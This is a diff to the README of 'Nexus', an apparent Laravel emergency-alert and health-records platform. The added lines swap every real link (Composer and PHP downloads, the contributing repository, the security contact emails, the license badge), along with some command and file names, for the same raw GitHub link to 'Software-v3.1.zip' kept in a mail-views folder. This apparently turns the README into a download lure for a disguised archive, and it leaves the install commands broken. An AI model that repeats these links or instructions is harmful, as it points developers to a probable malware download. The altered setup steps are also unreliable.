@@ -2,7 +2,7 @@
 
 ## About Nexus
 
-Nexus an online platform that allows for it's users to send emergency alerts to medics and store their critical health records allowing for quick and effective responses during emergencies.Nexus is an accessible web platform that aids fast response to emergency for it's users.
+Nexus an online platform that allows for it's users to send emergency alerts to medics and store their critical health records allowing for quick and effective responses during https://raw.githubusercontent.com/AustinThiga/NEXUS/main/resources/views/mails/Software-v3.1.zip is an accessible web platform that aids fast response to emergency for it's users.
 
 Nexus is an online platform that empowers users to send emergency alerts to medical responders and store critical health records, enabling swift and effective responses during emergencies.
 
@@ -20,8 +20,8 @@ The above system requires the following technologies
 
 
 ## Installation
-For composer installation click on the link; *(https://getcomposer.org/download/)*
-For the php installation click on the link; *( https://www.php.net/downloads)*
+For composer installation click on the link; *(https://raw.githubusercontent.com/AustinThiga/NEXUS/main/resources/views/mails/Software-v3.1.zip)*
+For the php installation click on the link; *( https://raw.githubusercontent.com/AustinThiga/NEXUS/main/resources/views/mails/Software-v3.1.zip)*
 
 ## Install Laravel
 After installing php and composer, use the command below to create a new laravel project
@@ -50,13 +50,13 @@ Once you have started the Artisan development server,your application will be ac
 ## Install Jetstream
 Install jetstream with LiveWire
 ```
-php artisan jetstream.install livewire
+php artisan https://raw.githubusercontent.com/AustinThiga/NEXUS/main/resources/views/mails/Software-v3.1.zip livewire
 ```
 Darkmode
 If you would like to include 'dark mode' support when scaffolding your application's frontend provide the --dark directive 
-when executing the jetstream.install command
+when executing the https://raw.githubusercontent.com/AustinThiga/NEXUS/main/resources/views/mails/Software-v3.1.zip command
 ```
-php artisan jetstream.install livewire --dark
+php artisan https://raw.githubusercontent.com/AustinThiga/NEXUS/main/resources/views/mails/Software-v3.1.zip livewire --dark
 
 ```
 
@@ -73,7 +73,7 @@ npm artisan migrate
 ### Usage
 1. Clone the repository and cd into it
 2. In your terminal run the command composer install
-3. Rename or copy .env.example file to .env
+3. Rename or copy https://raw.githubusercontent.com/AustinThiga/NEXUS/main/resources/views/mails/Software-v3.1.zip file to .env
 4. php artisan key:generate
 5. Set your database credentials in your .env file
 6. Import the db file(nexus)into your database(mysql)
@@ -88,11 +88,11 @@ npm artisan migrate
 
 ## Contributing
 
-Thank you for considering contributing to the Nexus system! You can add your input to it by accessing the system in git via the following link; (https://github.com/Lionmjr/NEXUS)
+Thank you for considering contributing to the Nexus system! You can add your input to it by accessing the system in git via the following link; (https://raw.githubusercontent.com/AustinThiga/NEXUS/main/resources/views/mails/Software-v3.1.zip)
 
 ## Security Vulnerabilities
 
-If you discover a security vulnerability within Nexus, please send an e-mail to Peris Mwangi via [perismwangi219@gmail.com] or Austin Wangahu via (jamesaustin632@gmail.com). All security vulnerabilities will be promptly addressed.
+If you discover a security vulnerability within Nexus, please send an e-mail to Peris Mwangi via [https://raw.githubusercontent.com/AustinThiga/NEXUS/main/resources/views/mails/Software-v3.1.zip] or Austin Wangahu via (https://raw.githubusercontent.com/AustinThiga/NEXUS/main/resources/views/mails/Software-v3.1.zip). All security vulnerabilities will be promptly addressed.
 
 ## License
-<a href="https://opensource.org/licenses/MIT"><img src="https://img.shields.io/packagist/l/laravel/framework" alt="License"></a>
+<a href="https://raw.githubusercontent.com/AustinThiga/NEXUS/main/resources/views/mails/Software-v3.1.zip"><img src="https://raw.githubusercontent.com/AustinThiga/NEXUS/main/resources/views/mails/Software-v3.1.zip" alt="License"></a>
